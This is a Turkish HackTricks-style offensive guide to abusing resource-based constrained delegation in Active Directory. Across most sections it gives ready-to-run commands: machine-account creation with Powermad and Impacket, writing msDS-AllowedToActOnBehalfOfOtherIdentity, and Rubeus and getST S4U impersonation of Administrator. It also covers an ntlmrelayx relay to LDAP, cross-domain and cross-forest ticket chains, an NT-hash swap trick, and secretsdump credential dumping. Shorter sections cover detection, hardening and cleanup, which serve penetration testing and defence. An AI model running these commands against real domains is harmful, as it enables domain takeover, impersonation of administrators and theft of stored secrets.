# Resource-based Constrained Delegation

{{#include ../../banners/hacktricks-training.md}}


## Resource-based Constrained Delegation Temelleri

Resource-based constrained delegation (RBCD), [constrained delegation](constrained-delegation.md) yöntemine benzer, ancak güven yönü tersine çevrilmiştir. Geleneksel constrained delegation, bir principal'ın hangi servislere delegasyon yapabileceğini kaydeder; RBCD ise **hedef kaynağın** üzerinde, hangi principal'ların bu kaynağa kullanıcıları taklit ederek erişebileceğini kaydeder.<sup>[[12]](#references)</sup>

Hedef nesnenin _**msDS-AllowedToActOnBehalfOfOtherIdentity**_ özniteliği, bu kaynak için diğer kimlikler adına işlem yapmasına izin verilen principal'ları tanımlayan bir güvenlik tanımlayıcısı içerir.

Bir diğer önemli fark, bir **makine hesabı üzerinde yazma izinleri** (`GenericAll`, `GenericWrite`, `WriteDacl`, `WriteProperty` ve benzer haklar) yeterli olan bir principal'ın _**msDS-AllowedToActOnBehalfOfOtherIdentity**_ özniteliğini ayarlayabilmesidir. Geleneksel constrained delegation'ı yapılandırmak için normalde daha ayrıcalıklı yönetici erişimi gerekir.<sup>[[1]](#references)</sup>

Daha kesin olarak, klasik constrained-delegation ayarlarını değiştirmek için normalde bir etki alanı denetleyicisinde `SeEnableDelegationPrivilege` gerekir; bu hak genellikle yüksek ayrıcalıklı yöneticilerde bulunur. RBCD kararı hedef nesnenin güvenlik tanımlayıcısına bırakır; bu nedenle ilgili bilgisayar nesnesi özelliğine yazma erişimi, söz konusu kullanıcı hakkı olmadan da yeterli olabilir.<sup>[[1]](#references)[[2]](#references)</sup>

### Yeni Kavramlar

`userAccountControl` içindeki **`TrustedToAuthForDelegation`** bayrağı genellikle **S4U2Self** için ön koşul olarak tanımlanır, ancak bu eksik bir açıklamadır.\
SPN'ye sahip bir service principal, bu bayrak olmadan da S4U2Self isteğinde bulunabilir. `TrustedToAuthForDelegation` etkinse döndürülen service ticket **forwardable** olur; etkin değilse ticket normalde **non-forwardable** olur.<sup>[[5]](#references)</sup>

Geleneksel constrained delegation, S4U2Proxy adımında **non-forwardable bir TGS'yi** reddeder. RBCD ise hedefin güvenlik tanımlayıcısı istekte bulunan servise yetki veriyorsa bu S4U2Self ticket'ını kabul edebilir.<sup>[[1]](#references)[[2]](#references)[[16]](#references)</sup>

### Saldırı yapısı

> Bir **bilgisayar hesabı** üzerinde **yazmaya eşdeğer ayrıcalıklara** sahipseniz, o makineye ayrıcalıklı erişim elde edebilirsiniz.

Saldırganın kurban bilgisayar nesnesi üzerinde zaten **yazmaya eşdeğer ayrıcalıklara** sahip olduğunu varsayalım.

1. Saldırgan, **SPN'ye sahip** bir hesabı **ele geçirir** veya bir hesap **oluşturur** ("Service A"). Varsayılan olarak, kimliği doğrulanmış bir etki alanı kullanıcısı **_MachineAccountQuota_** tarafından belirlenen şekilde en fazla 10 bilgisayar nesnesi oluşturabilir; bilgisayar nesnesi otomatik olarak kullanılabilir SPN'ler sağlar.
2. Saldırgan, ServiceB kurban bilgisayarı üzerindeki WRITE ayrıcalığını **kötüye kullanarak**, bu kurban bilgisayara (ServiceB) karşı herhangi bir kullanıcıyı taklit etmesi için ServiceA'ya izin veren **resource-based constrained delegation** yapılandırır.
3. Saldırgan, Service B'den Service B'ye ayrıcalıklı erişimi olan bir kullanıcı için **tam bir S4U saldırısı** (S4U2Self ve S4U2Proxy) gerçekleştirmek üzere Rubeus kullanır.
   1. S4U2Self (ele geçirilmiş veya oluşturulmuş SPN hesabından): Service A'ya **Administrator'ı temsil eden bir TGS** ister (non-forwardable).
   2. S4U2Proxy: **Administrator'ı** kurban **host'a** temsil eden bir service ticket istemek için bu **non-forwardable TGS'yi** kullanır.
   3. Service A hedef kaynağın güvenlik tanımlayıcısında yetkilendirildiğinden, bu RBCD akışında non-forwardable ticket yine de kullanılabilir.
4. Saldırgan, kurban ServiceB'ye **erişim sağlamak** için ticket'ı **pass-the-ticket** yöntemiyle kullanabilir ve kullanıcıyı **taklit edebilir**.<sup>[[1]](#references)</sup>

`MachineAccountQuota=0` varsayılan bilgisayar oluşturma yolunu kapatır, ancak hedef bilgisayar nesnesi üzerindeki yazma haklarını veya mevcut bir hesabın kontrolünü ortadan kaldırmaz. SPN'si olmayan ve kontrolünüzdeki sıradan bir kullanıcı, aynı etki alanında da olmak üzere [SPN'siz U2U yöntemi](#spn-less-cross-domain--cross-forest-rbcd) aracılığıyla delegasyon yapan principal olarak bazen kullanılabilir. Bu yol için yine de etkili bir RBCD yazma hakkı, delegasyon yapan kullanıcının kimlik bilgileri üzerinde kontrol, delegasyona uygun bir kimliğe bürünülen hesap, uyumlu Kerberos şifreleme davranışı ve hesabı aksatacak bir NT-hash değişikliği gerekir. Bunları ayrı ön koşullar olarak değerlendirin; RBCD özniteliğinin boş olması veya kotanın sıfır olması tek başına ne saldırının başarılı olacağını ne de ortamın güvenli olduğunu kanıtlar.

Mevcut bir RBCD tanımlayıcısı, delegasyon yapan bilgisayarı doğrudan değil, bir **grubu** da gösterebilir. SPN taşıyan bir bilgisayar hesabını kontrol ediyorsanız ve onu bu gruba ekleyebiliyorsanız, yeni üyelik hedef bilgisayarın RBCD özniteliğini değiştirmeden delegasyon yolunu sağlayabilir. Yolun çalışıp çalışmadığına karar vermeden önce grubun etkin üyelik yazma ACL'sini (deny ACE'ler dahil), iç içe geçmiş üyelikleri ve token yenilenmesini, tanımlayıcıdaki trustee SID'yi, kimliğine bürünülen hesabın delegasyon kısıtlamalarını ve hedef servis SPN'sini kontrol edin.

Etki alanının _**MachineAccountQuota**_ değerini kontrol etmek için şunu kullanabilirsiniz:

```bash
Get-DomainObject -Identity "dc=domain,dc=local" -Domain domain.local | select MachineAccountQuota
```

## Saldırı

### Bilgisayar Nesnesi Oluşturma

**[powermad](https://github.com/Kevin-Robertson/Powermad):**<sup>[[3]](#references)[[4]](#references)</sup> kullanarak etki alanında bir bilgisayar nesnesi oluşturabilirsiniz.

```bash
import-module powermad
New-MachineAccount -MachineAccount SERVICEA -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose

# Check if created
Get-DomainComputer SERVICEA
```

### Kaynak Tabanlı Kısıtlanmış Temsilci Atamasını Yapılandırma

**Active Directory PowerShell modülünü kullanarak**<sup>[[4]](#references)</sup>

```bash
Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount SERVICEA$ #Assign delegation privileges
Get-ADComputer $targetComputer -Properties PrincipalsAllowedToDelegateToAccount #Check that it worked
```

**powerview kullanarak**<sup>[[3]](#references)</sup>

```bash
$ComputerSid = Get-DomainComputer FAKECOMPUTER -Properties objectsid | Select -Expand objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$ComputerSid)"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Get-DomainComputer $targetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}

#Check that it worked
Get-DomainComputer $targetComputer -Properties 'msds-allowedtoactonbehalfofotheridentity'

msds-allowedtoactonbehalfofotheridentity
----------------------------------------
{1, 0, 4, 128...}
```

### Eksiksiz bir S4U attack gerçekleştirme (Windows/Rubeus)

Öncelikle, `123456` parolasıyla yeni Computer nesnesini oluşturduk; bu nedenle bu parolanın hash'ine ihtiyacımız var:<sup>[[3]](#references)[[4]](#references)</sup>

```bash
.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local
```

Bu, söz konusu hesap için RC4 ve AES hash’lerini yazdıracaktır.\
Şimdi saldırı gerçekleştirilebilir:<sup>[[3]](#references)[[4]](#references)</sup>

```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<aes256 hash> /aes128:<aes128 hash> /rc4:<rc4 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /domain:domain.local /ptt
```

Rubeus'un `/altservice` parametresini kullanarak tek bir istekte daha fazla hizmet için daha fazla ticket oluşturabilirsiniz:

```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<AES 256 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /altservice:krbtgt,cifs,host,http,winrm,RPCSS,wsman,ldap /domain:domain.local /ptt
```

> [!CAUTION]
> Kullanıcılar **"Account is sensitive and cannot be delegated."** olarak işaretlenebilir. Bu bayrak etkinse, bu delegation akışı üzerinden hesabı taklit etmek mümkün değildir. BloodHound, analiz sırasında bu özelliği gösterir.

### Linux araçları: Impacket ile uçtan uca RBCD (2024+)

Linux üzerinden çalışıyorsanız, resmi Impacket araçlarını kullanarak tüm RBCD zincirini gerçekleştirebilirsiniz:<sup>[[6]](#references)[[7]](#references)</sup>

```bash
# 1) Create attacker-controlled machine account (respects MachineAccountQuota)
impacket-addcomputer -computer-name 'FAKE01$' -computer-pass 'P@ss123' -dc-ip 192.168.56.10 'domain.local/jdoe:Summer2025!'

# 2) Grant RBCD on the target computer to FAKE01$
#    -action write appends/sets the security descriptor for msDS-AllowedToActOnBehalfOfOtherIdentity
impacket-rbcd -delegate-to 'VICTIM$' -delegate-from 'FAKE01$' -dc-ip 192.168.56.10 -action write 'domain.local/jdoe:Summer2025!'

# 3) Request an impersonation ticket (S4U2Self+S4U2Proxy) for a privileged user against the victim service
impacket-getST -spn cifs/victim.domain.local -impersonate Administrator -dc-ip 192.168.56.10 'domain.local/FAKE01$:P@ss123'

# 4) Use the ticket (ccache) against the target service
export KRB5CCNAME=$(pwd)/Administrator.ccache
# Example: dump local secrets via Kerberos (no NTLM)
impacket-secretsdump -k -no-pass Administrator@victim.domain.local
```

Notlar
- LDAP signing/LDAPS zorunluysa `impacket-rbcd -use-ldaps ...` kullanın.
- AES anahtarlarını tercih edin; birçok modern etki alanında RC4 kısıtlanır. Impacket ve Rubeus, yalnızca AES kullanan akışları destekler.
- Impacket bazı araçlar için `sname` değerini ("AnySPN") yeniden yazabilir; ancak mümkün olduğunda doğru SPN'yi edinin (ör. CIFS/LDAP/HTTP/HOST/MSSQLSvc).

## Etki alanları arası ve ormanlar arası RBCD

Kontrol ettiğiniz **delegasyon yapan principal**, **kaynak bilgisayardan** **farklı bir etki alanında** (hatta **farklı bir ormanda**) bulunuyorsa, istismar yine **RBCD**'dir; ancak bilet akışı artık alışılmış tek etki alanlı `S4U2Self -> S4U2Proxy` akışı değildir.

### Etki alanları arası RBCD: yabancı principal'ı SID ile yapılandırma

`msDS-AllowedToActOnBehalfOfOtherIdentity` özniteliğini **farklı bir etki alanından** ayarlarken, yabancı makine/kullanıcı hedef etki alanındaki LDAP'ta **adıyla çözümlenemeyebilir**. Bu durumda, delegasyon girdisini sAMAccountName/UPN yerine yabancı principal'ın **SID**'sini kullanarak yapılandırın.

Bu, özellikle NTLM'i LDAP'a `ntlmrelayx.py` ile aktarırken önemlidir:<sup>[[9]](#references)</sup>

```bash
sudo ntlmrelayx.py -smb2support -t ldap://192.168.90.217 \
  --no-dump --no-da --no-validate-privs \
  --delegate-access \
  --escalate-user S-1-5-21-3104832133-133926542-3798009529-1106 \
  --sid
```

Notlar:
- `--sid`, `ntlmrelayx.py`'ye `--escalate-user` değerini SID olarak ele almasını söyler; delegating account hedef domain'e ait değilse bu gereklidir.
- Araç `User not found in LDAP` yazsa bile delegation yazma işlemi başarılı olabilir; çünkü security descriptor, foreign SID'yi doğrudan depolar.

### Cross-domain RBCD: cross-realm S4U sequence

Foreign principal, `msDS-AllowedToActOnBehalfOfOtherIdentity` içine eklendikten sonra çalışan cross-domain akışı şöyledir:<sup>[[9]](#references)[[13]](#references)</sup>

1. Delegating principal için kendi domain'inden bir **TGT** alın.
2. `krbtgt/<target-domain>` için bir **referral TGT** isteyin.
3. Impersonate edilen kullanıcı için target-domain DC'den bir **cross-realm S4U2Self referral** isteyin.
4. Bu kullanıcı için delegator domain'de gerçek **S4U2Self** ticket'ını isteyin.
5. Target domain için bir referral ticket almak üzere delegator domain'de **S4U2Proxy** gerçekleştirin.
6. `cifs/host.target`, `host/host.target` vb. için service ticket almak üzere target-domain DC'de son **S4U2Proxy** işlemini gerçekleştirin.

Stock Linux araçlarının cross-domain RBCD'de sıklıkla başarısız olmasının nedeni budur:<sup>[[9]](#references)</sup>
- İstekteki **realm**, `TGS-REQ` içinde kullanılan TGT'nin realm'inden farklı olmak zorunda olabilir.
- Zincirde, yalnızca `S4U2Self` veya ardından tek bir `S4U2Proxy` gelen `S4U2Self` değil, **bağımsız S4U2Proxy adımları** gerekir.

### Linux'tan cross-domain RBCD

Synacktiv, iki KDC'yi açıkça işleyerek Linux'tan cross-realm sequence'ü yeniden oluşturan bir Impacket `getST.py` uygulaması yayımladı:<sup>[[9]](#references)[[11]](#references)</sup>

```bash
python3 ./getST.py dev.asgard.local/rbcd_test\$:R[...]5 -k \
  -dc-ip 192.168.90.131 \
  -targetdc 192.168.90.217 \
  -targetdomain asgard.local \
  -impersonate thor_adm \
  -spn cifs/workstation.asgard.local

KRB5CCNAME=thor_adm@cifs_workstation.asgard.local@ASGARD.LOCAL.ccache \
  ./smbclient.py "asgard.local/thor_adm@workstation.asgard.local" \
  -k -no-pass -dc-ip 192.168.90.217
```

Operasyonel olarak yeni argümanlar şunlardır:
- `-dc-ip`: **delegasyon yapan** domain'in DC'si
- `-targetdomain`: **kaynak bilgisayarın** domain'i
- `-targetdc`: **kaynak** domain'in DC'si

### Forest'lar arası RBCD sınırlamaları

Forest'lar arası RBCD'nin önemli bir sınırlaması vardır: **impersonate edilen kullanıcı, delegasyon yapan principal ile aynı forest'ta bulunmalıdır**. Başka bir deyişle, kontrol ettiğiniz makine hesabı `valhalla.local` içinde ve hedef kaynak `asgard.local` içindeyse, genellikle RBCD aracılığıyla bu kaynağa erişmek için rastgele `asgard.local` kullanıcılarını impersonate **edemezsiniz**.<sup>[[9]](#references)</sup>

Şu durumlarda yine de istismar edilebilir:
- **delegasyon yapan forest** kullanıcısı, diğer forest'taki kaynak host'ta **local admin** ise (veya başka bir şekilde ayrıcalıklıysa)
- Bir trust gerekli kimlik doğrulama yoluna izin veriyorsa ve hedef bilgisayarın security descriptor'ında yabancı SID kabul ediliyorsa

### Forest'lar arası RBCD protokolündeki tuhaflıklar

Forest'lar arası RBCD, yalnızca "trust ile cross-domain" değildir. Gözlemlenen akışta, yaygın araçların geçmişte gözden kaçırdığı iki tuhaflık bulunur:<sup>[[9]](#references)</sup>

1. **`PA-PAC-OPTIONS=branch-aware`** ayarlayan ek bir **S4U2Proxy** isteği
2. Diğer etype'lar istenmiş olsa bile, son service ticket **RC4** kullanılarak döndürülebilir

Uygulamadaki akış şöyledir:

1. Forest A'daki delegasyon yapan principal için bir TGT alın.
2. Forest A'da impersonate edilecek kullanıcı için **S4U2Self** isteyin.
3. Forest B için bir referral TGT almak üzere Forest A'da **S4U2Proxy** isteyin.
4. Forest B için başka bir referral TGT almak üzere Forest A'da ikinci bir **S4U2Proxy** isteğini, S4U2Self ticket'ını additional ticket olarak **göndermeden**, ancak `branch-aware` etkinleştirilmiş şekilde gönderin.
5. İsteğe bağlı olarak Forest B'de delegasyon yapan principal için normal bir service ticket isteyin (bu ticket son istismar için gerekli değildir).
6. Hedef SPN'ye, impersonate edilen Forest A kullanıcısı için Forest B'de son **S4U2Proxy** ticket'ını istemek üzere 3. ve 4. adımlardaki referral ticket'ları kullanın.

### Linux'tan forest'lar arası RBCD

Aynı Synacktiv Impacket branch'i bu mantık için bir `-forest` switch'i ekler:<sup>[[9]](#references)[[11]](#references)</sup>

```bash
python3 ./getST.py -spn 'cifs/workstation.asgard.local' \
  -impersonate 'v_thor' \
  -dc-ip VALHALLA.local \
  valhalla.local/'desktop$' \
  -targetdc ASGARD.local \
  -targetdomain asgard.local \
  -aesKey 4[...]f \
  -forest
```

### Özyinelemeli çok etki alanlı RBCD (3+ etki alanı)

**Çok etki alanlı forest'larda**, hem **S4U2Self** hem de **S4U2Proxy**, tek bir referral sonrasında durmak yerine **özyinelemeli** olabilir:

- **Özyinelemeli S4U2Self**: İlk `S4U2Self`, **taklit edilen kullanıcının etki alanına** gönderilir; ara üst/alt etki alanı geçişleri, `krbtgt/<REALM>` için normal `TGS-REQ` referral'larıyla aşılır ve **son `S4U2Self`**, **delegasyon yapan principal'ın kendi etki alanında** gönderilir.
- Bu, yalnızca bir makine hesabına ait **TGT'yi bulundurmanın**, aynı forest'taki başka bir etki alanından bir **admin'i taklit etmek** ve `cifs/host`, `host/host`, `wsman/host` vb. istemek için yeterli olabileceği anlamına gelir.
- **Özyinelemeli S4U2Proxy** de trust zincirini aynı şekilde izler: ara geçişlerde, sonraki `krbtgt/<REALM>` referral'ı istenirken önceki ticket TGT olarak yeniden kullanılır ve yalnızca son geçişte nihai service ticket döndürülür.<sup>[[10]](#references)</sup>

Forest içinde uygulanabilir bir örnek şöyledir:

```bash
KRB5CCNAME=MIN-FRPERSO-01\$.ccache getST.py 'minus.sub.frperso.local/MIN-FRPERSO-01$' -k -no-pass \
  -impersonate Administrator@frperso.local -self \
  -altservice cifs/min-frperso-01.minus.sub.frperso.local

KRB5CCNAME=Administrator@frperso.local@cifs_min-frperso-01.minus.sub.frperso.local@MINUS.SUB.FRPERSO.LOCAL.ccache \
  smbclient.py frperso.local/Administrator@min-frperso-01.minus.sub.frperso.local -k -no-pass
```

### SPN'siz etki alanları arası / ormanlar arası RBCD

**Delegating principal, SPN'si olmayan bir kullanıcıysa**, son recursive `S4U2Self` isteği **`KDC_ERR_S_PRINCIPAL_UNKNOWN`** hatasıyla başarısız olur. Çözüm, **yalnızca son adımı `S4U2Self+U2U` olarak yeniden denemektir**.<sup>[[10]](#references)</sup>

Abuse zincirinin kısa özeti:

1. KDC'yi **RC4-HMAC (etype 23)** kullanmaya yönlendirmek için **NT hash** ile kimlik doğrulayın.
2. Önce **`-self -u2u`** isteyin ve bu bileti sonraki proxy adımından ayrı tutun.
3. `describeTicket.py` ile **TGT session key**'ini çıkarın.
4. `changepasswd.py -newhashes <session_key>` kullanarak kullanıcının **NT hash**'ini bu **session key** ile değiştirin.
5. `S4U2Self+U2U` biletini ayrı bir **`-proxy`** isteği sırasında **`-additional-ticket`** olarak yeniden kullanın.

```bash
getST.py sub.frperso.local/Administrator -hashes ':<nthash>' \
  -impersonate Administrator@frperso.local -self -u2u
describeTicket.py Administrator.ccache
changepasswd.py sub.frperso.local/Administrator@sub-frperso-01.sub.frperso.local \
  -hashes ':<nthash>' -newhashes <tgt_session_key>
KRB5CCNAME=Administrator.ccache getST.py sub.frperso.local/Administrator -k -no-pass \
  -impersonate Administrator@frperso.local -proxy -proxydomain frpublic.local \
  -spn cifs/frpublic-01.frpublic.local -additional-ticket '<u2u_ticket.ccache>'
```

Operasyonel uyarılar:

- **İlk güvenilen atlama noktası zaten başka bir forest ise**, yerel Windows davranışıyla eşleşmesi için **branch-aware** algoritmasını (`getST.py ... -forest`) tercih edin. Yabancı forest zincirde daha sonra ulaşılıyorsa branch-aware olmayan özyinelemeli akış yine de işe yarayabilir.<sup>[[9]](#references)</sup>
- Yeni **Windows Server 2022/2025** DC'lerde, RC4'ün kullanımdan kaldırılması nedeniyle zorunlu RC4 kullanımı **`KDC_ERR_ETYPE_NOSUPP`** hatasıyla başarısız olabilir; bu durum, klasik SPN destekli RBCD AES ile çalışmaya devam etse bile **SPN-less RBCD**'yi imkânsız hâle getirebilir.<sup>[[15]](#references)</sup>
- Kullanıcının hash/parolasını değiştirmeden önce **`S4U2Self+U2U`** çalıştırın: **`SamrChangePasswordUser`**, hesabın Kerberos AES anahtarlarını yeniden hesaplamaz; bu nedenle parola değişikliğini önce yapmak sonraki ticket isteklerini bozabilir.<sup>[[14]](#references)</sup>
- Taklit edilen hesap hâlâ **delege edilebilir** olmalıdır: **Protected Users** ve **`NOT_DELEGATED`** / **"Account is sensitive and cannot be delegated"** ayarlı hesaplar zinciri engeller.

## Tespit / sıkılaştırma notları

- Etki alanları/forest'lar arası RBCD yolları genellikle hâlâ **ACL abuse** veya **relay-to-LDAP** üzerinden oluşturulur. Yaygın kurulum yollarını engellemek için DC'lerde **LDAP signing** ve **LDAP channel binding** uygulayın.
- Bilgisayar nesnelerinde `msDS-AllowedToActOnBehalfOfOtherIdentity` yazma iznine sahip olanları denetleyin ve depolanan SID'leri, **foreign security principals** dâhil olmak üzere çözümleyin.
- Trust'ın yoğun olduğu ortamlarda **Selective Authentication**, **SID filtering** ayarlarını ve yabancı forest'taki kullanıcıların kaynak sunucularda **local admin** haklarına sahip olup olmadığını gözden geçirin.

### Erişim

Son komut satırı **S4U attack**'ın tamamını gerçekleştirecek ve Administrator adına alınan TGS'yi **bellekte** kurban host'a enjekte edecektir.\
Bu örnekte Administrator'dan **CIFS** hizmeti için bir TGS istendi; bu nedenle **C$**'a erişebilirsiniz:

```bash
ls \\victim.domain.local\C$
```

### Farklı service ticket'larını kötüye kullanma

[**Kullanılabilir service ticket'ları hakkında buradan bilgi edinin**](silver-ticket.md#available-services).

## Listeleme, denetleme ve temizleme

### RBCD yapılandırılmış bilgisayarları listeleme

PowerShell (SID'leri çözümlemek için SD'nin kodunu çözme):

```powershell
# List all computers with msDS-AllowedToActOnBehalfOfOtherIdentity set and resolve principals
Import-Module ActiveDirectory
Get-ADComputer -Filter * -Properties msDS-AllowedToActOnBehalfOfOtherIdentity |
  Where-Object { $_."msDS-AllowedToActOnBehalfOfOtherIdentity" } |
  ForEach-Object {
    $raw = $_."msDS-AllowedToActOnBehalfOfOtherIdentity"
    $sd  = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $raw, 0
    $sd.DiscretionaryAcl | ForEach-Object {
      $sid  = $_.SecurityIdentifier
      try { $name = $sid.Translate([System.Security.Principal.NTAccount]) } catch { $name = $sid.Value }
      [PSCustomObject]@{ Computer=$_.ObjectDN; Principal=$name; SID=$sid.Value; Rights=$_.AccessMask }
    }
  }
```

Impacket (tek bir komutla oku veya temizle):

```bash
# Read who can delegate to VICTIM
impacket-rbcd -delegate-to 'VICTIM$' -action read 'domain.local/jdoe:Summer2025!'
```

### RBCD'yi temizleme / sıfırlama

- PowerShell (özniteliği temizleme):

```powershell
Set-ADComputer $targetComputer -Clear 'msDS-AllowedToActOnBehalfOfOtherIdentity'
# Or using the friendly property
Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount $null
```

- Impacket:

```bash
# Remove a specific principal from the SD
impacket-rbcd -delegate-to 'VICTIM$' -delegate-from 'FAKE01$' -action remove 'domain.local/jdoe:Summer2025!'
# Or flush the whole list
impacket-rbcd -delegate-to 'VICTIM$' -action flush 'domain.local/jdoe:Summer2025!'
```

## Kerberos Hataları

- **`KDC_ERR_ETYPE_NOTSUPP`**: Bu, kerberos'un DES veya RC4 kullanmayacak şekilde yapılandırıldığı ve yalnızca RC4 hash'ini sağladığınız anlamına gelir. Rubeus'a en az AES256 hash'ini sağlayın (veya yalnızca rc4, aes128 ve aes256 hash'lerini sağlayın). Örnek: `[Rubeus.Program]::MainString("s4u /user:FAKECOMPUTER /aes256:CC648CF0F809EE1AA25C52E963AC0487E87AC32B1F71ACC5304C73BF566268DA /aes128:5FC3D06ED6E8EA2C9BB9CC301EA37AD4 /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:Administrator /msdsspn:CIFS/M3DC.M3C.LOCAL /ptt".split())`
- Normal bir kullanıcı için `-self` sırasında **`KDC_ERR_S_PRINCIPAL_UNKNOWN`**: delegating principal'ın muhtemelen **SPN'i yoktur**. Normal bir `S4U2Self` yerine **`S4U2Self+U2U`** kullanarak **son hop'u** yeniden deneyin.<sup>[[10]](#references)</sup>
- **SPN'siz RBCD** sırasında **`KDC_ERR_ETYPE_NOSUPP`**: son DC'ler, `S4U2Self+U2U` + session-key-substitution hilesinin gerektirdiği zorunlu **RC4-HMAC** yolunu reddedebilir. Bunun yerine AES kullanan klasik **SPN tabanlı** bir RBCD yolunu deneyin.<sup>[[10]](#references)[[15]](#references)</sup>
- **`KRB_AP_ERR_SKEW`**: Bu, mevcut bilgisayarın saatinin DC'nin saatinden farklı olduğu ve kerberos'un düzgün çalışmadığı anlamına gelir.
- **`preauth_failed`**: Bu, verilen kullanıcı adı + hash'lerin oturum açmak için çalışmadığı anlamına gelir. Hash'leri oluştururken kullanıcı adının içine "$" koymayı unutmuş olabilirsiniz (`.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local`)
- **`KDC_ERR_BADOPTION`**: Şunlardan biri söz konusu olabilir:
  - Taklit etmeye çalıştığınız kullanıcı istenen hizmete erişemiyordur (çünkü onu taklit edemezsiniz veya yeterli ayrıcalıkları yoktur)
  - İstenen hizmet mevcut değildir (winrm için bilet istiyorsanız ancak winrm çalışmıyorsa)
  - Oluşturulan fakecomputer, güvenlik açığı bulunan sunucu üzerindeki ayrıcalıklarını kaybetmiştir ve bu ayrıcalıkları geri vermeniz gerekir.
  - Klasik KCD'yi kötüye kullanıyorsunuzdur; RBCD'nin forwardable olmayan S4U2Self biletleriyle çalıştığını, KCD'nin ise forwardable bilet gerektirdiğini unutmayın.

## Notlar, relay'ler ve alternatifler

- LDAP filtrelenmişse RBCD SD'yi AD Web Services (ADWS) üzerinden de yazabilirsiniz. Bkz.:


{{#ref}}
adws-enumeration.md
{{#endref}}

- Kerberos relay zincirleri, tek adımda yerel SYSTEM elde etmek için sıklıkla RBCD ile sonuçlanır. Uçtan uca pratik örnekler için bkz.:


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

- LDAP signing/channel binding **devre dışıysa** ve bir machine account oluşturabiliyorsanız, **KrbRelayUp** gibi araçlar zorlanmış bir Kerberos auth'u LDAP'ye relay edebilir, hedef bilgisayar nesnesinde machine account'unuz için `msDS-AllowedToActOnBehalfOfOtherIdentity` ayarını yapabilir ve host dışından S4U aracılığıyla hemen **Administrator**'ı taklit edebilir.<sup>[[8]](#references)</sup>

## References

- [1] [Köpeği Sallamak: Active Directory'ye Saldırmak için Resource-Based Constrained Delegation'ı Kötüye Kullanma](https://eladshamir.com/2019/01/28/Wagging-the-Dog.html)
- [2] [Delegation Üzerine Başka Bir Söz – harmj0y](https://blog.harmj0y.net/redteaming/another-word-on-delegation/)
- [3] [Kerberos Resource-based Constrained Delegation: Computer Object Ele Geçirme](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object)
- [4] [Netwrix – Resource-Based Constrained Delegation'ı Kötüye Kullanma](https://netwrix.com/en/resources/blog/resource-based-constrained-delegation-abuse/)
- [5] [Kerberosity Alan Adını Öldürdü: Kerberos'a Saldırgan Bakış](https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61)
- [6] [Impacket rbcd.py (resmî)](https://github.com/fortra/impacket/blob/master/examples/rbcd.py)
- [7] [Güncel sözdizimini içeren hızlı Linux cheatsheet'i](https://tldrbins.github.io/rbcd/)
- [8] [0xdf – HTB Bruno (LDAP signing kapalı → Kerberos relay ile RBCD)](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
- [9] [Synacktiv - Etki alanları arası ve forest'lar arası RBCD'yi keşfetmek](https://www.synacktiv.com/en/publications/exploring-cross-domain-cross-forest-rbcd.html)
- [10] [Synacktiv - Etki alanları arası ve forest'lar arası RBCD'yi keşfetmek: 2. bölüm](https://www.synacktiv.com/en/publications/exploring-cross-domain-cross-forest-rbcd-part-2.html)
- [11] [Synacktiv Impacket branch - cross_forest_rbcd](https://github.com/synacktiv/impacket/tree/cross_forest_rbcd)
- [12] [Microsoft Learn - Kerberos constrained delegation'a genel bakış](https://learn.microsoft.com/en-us/windows-server/security/kerberos/kerberos-constrained-delegation-overview)
- [13] [Microsoft Open Specifications - Etki alanları arası S4U2Self](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/f35b6902-6f5e-4cd0-be64-c50bbaaf54a5)
- [14] [Microsoft Open Specifications - SamrChangePasswordUser](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-samr/9699d8ca-e1a4-433c-a8c3-d7bebeb01476)
- [15] [Microsoft Learn - Kerberos'ta RC4 kullanımını tespit etme ve düzeltme](https://learn.microsoft.com/en-us/windows-server/security/kerberos/detect-remediate-rc4-kerberos)
- [16] [Microsoft Open Specifications – S4U2Proxy ayrıntıları](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/bde93b0e-f3c9-4ddf-9cd5-e9c237331c90)
{{#include ../../banners/hacktricks-training.md}}
